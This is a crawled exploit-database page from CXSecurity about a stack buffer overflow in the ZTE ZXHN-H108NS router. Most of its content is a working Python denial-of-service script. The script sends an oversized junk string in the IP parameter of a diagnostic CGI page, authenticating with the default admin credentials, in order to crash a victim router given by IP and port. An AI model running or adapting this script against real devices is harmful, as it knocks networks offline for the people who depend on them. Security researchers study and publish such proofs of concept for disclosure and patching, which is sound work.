---
title: ZTE ZXHN-H108NS Stack Buffer Overflow / Denial Of Service
url: https://cxsecurity.com/issue/WLB-2022110034
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-22
fetch_date: 2025-10-03T23:21:25.279906
---

# ZTE ZXHN-H108NS Stack Buffer Overflow / Denial Of Service

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ZTE ZXHN-H108NS Stack Buffer Overflow / Denial Of Service** **2022.11.21**  Credit:  **[George Tsimpidas](https://cxsecurity.com/author/George%2BTsimpidas/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

# Exploit Title: Router ZTE-H108NS - Stack Buffer Overflow (DoS)
# Date: 19-11-2022
# Exploit Author: George Tsimpidas # Vendor: https://www.zte.com.cn/global/
# Firmware: H108NSV1.0.7u\_ZRD\_GR2\_A68
# Usage: python zte-exploit.py <victim-ip> <port>
# CVE: N/A # Tested on: Debian 5.18.5
#!/usr/bin/python3
import sys
import socket
from time import sleep
host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user
junk = b"1500Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae"
\* 5
buffer = b"GET /cgi-bin/tools\_test.asp?testFlag=1&Test\_PVC=0&pingtest\_type=Yes&IP=192.168.1.1"
+ junk + b"&TestBtn=START HTTP/1.1\r\n"
buffer += b"Host: 192.168.1.1\r\n"
buffer += b"User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:91.0)
Gecko/20100101 Firefox/91.0\r\n"
buffer += b"Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8\r\n"
buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
buffer += b"Authorization: Basic YWRtaW46YWRtaW4=\r\n"
buffer += b"Connection: Keep-Alive\r\n"
buffer += b"Cookie:
SID=21caea85fe39c09297a2b6ad4f286752fe47e6c9c5f601c23b58432db13298f2;
\_TESTCOOKIESUPPORT=1; SESSIONID=53483d25\r\n"
buffer += b"Upgrade-Insecure-Requests: 1\r\n\r\n"
print("[\*] Sending evil payload...")
s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.connect((host, port))
s.send(buffer)
sleep(1)
s.close()
print("[+] Crashing boom boom ~ check if target is down ;)")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110034)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top